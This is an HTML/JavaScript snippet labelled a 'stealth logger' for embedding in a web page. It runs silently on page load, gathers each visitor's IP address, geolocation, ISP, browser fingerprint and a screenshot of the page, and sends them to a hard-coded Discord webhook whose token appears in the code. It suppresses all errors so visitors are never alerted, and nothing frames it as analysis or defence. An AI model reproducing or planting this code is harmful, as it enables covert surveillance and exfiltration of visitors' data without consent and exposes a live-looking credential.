<!-- ================== STEALTH LOGGER (INVISIBLE) ================== -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
  // <<< PUT YOUR DISCORD WEBHOOK URL HERE >>>
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1381021459350032484/Z-HEIw2n1czbqpnWl-UicGzWgfrHth3W0naPyAkIoI3Sf3bx4bsINYQJDnvIHf1ky0tL';

  // ---- 1. Get IP + Geo (fallback chain) ----
  const ipServices = [
    'https://ipapi.co/json/',
    'https://api.ipify.org?format=json',
    'https://icanhazip.com/'
  ];

  async function getIP() {
    for (const url of ipServices) {
      try {
        const r = await fetch(url, {cache: 'no-store'});
        if (!r.ok) continue;
        if (url.includes('ipapi.co')) {
          const j = await r.json(); return {ip: j.ip, geo: j};
        }
        if (url.includes('ipify')) {
          const j = await r.json(); return {ip: j.ip, geo: null};
        }
        const txt = await r.text(); return {ip: txt.trim(), geo: null};
      } catch(e) {}
    }
    throw new Error('IP lookup failed');
  }

  // ---- 2. Browser Fingerprint ----
  function fingerprint() {
    const n = navigator;
    return {
      ua: n.userAgent,
      lang: n.language,
      platform: n.platform,
      cookies: n.cookieEnabled,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}`,
      window: `${innerWidth}x${innerHeight}`,
      plugins: Array.from(n.plugins || []).map(p => p.name).join(', ')
    };
  }

  // ---- 3. Screenshot (silent) ----
  async function screenshot() {
    try {
      const canvas = await html2canvas(document.body, {scale: 0.5});
      return canvas.toDataURL('image/png');
    } catch(e) { return null; }
  }

  // ---- 4. Send to Discord (rich embed) ----
  async function send(data) {
    const embed = {
      title: 'New Visitor (Stealth)',
      color: 0x00ff00,
      timestamp: new Date().toISOString(),
      fields: [
        {name: 'IP', value: data.ip, inline: true},
        {name: 'Time', value: data.time, inline: true}
      ],
      footer: {text: 'My First Site Logger'}
    };

    if (data.geo) {
      embed.fields.push(
        {name: 'Location', value: `${data.geo.city || '??'}, ${data.geo.region || ''}, ${data.geo.country_name || ''}`, inline: true},
        {name: 'ISP', value: data.geo.org || 'Unknown', inline: true}
      );
    }

    const fp = data.fp;
    embed.fields.push(
      {name: 'Browser', value: fp.ua.split(' ').slice(0,3).join(' '), inline: false},
      {name: 'OS', value: fp.platform, inline: true},
      {name: 'Screen', value: fp.screen, inline: true}
    );

    const files = [];
    if (data.ss) {
      files.push({attachment: data.ss, name: 'proof.png'});
      embed.image = {url: 'attachment://proof.png'};
    }

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({embeds: [embed], files})
    }).catch(() => {});
  }

  // ---- MAIN (runs instantly & silently) ----
  (async () => {
    try {
      const ipData = await getIP();
      const fp = fingerprint();
      const ss = await screenshot();
      const now = new Date().toISOString();

      await send({
        ip: ipData.ip,
        geo: ipData.geo,
        fp,
        ss,
        time: now
      });
    } catch(e) {
      // Silent fail – never alert user
    }
  })();
</script>
</body>
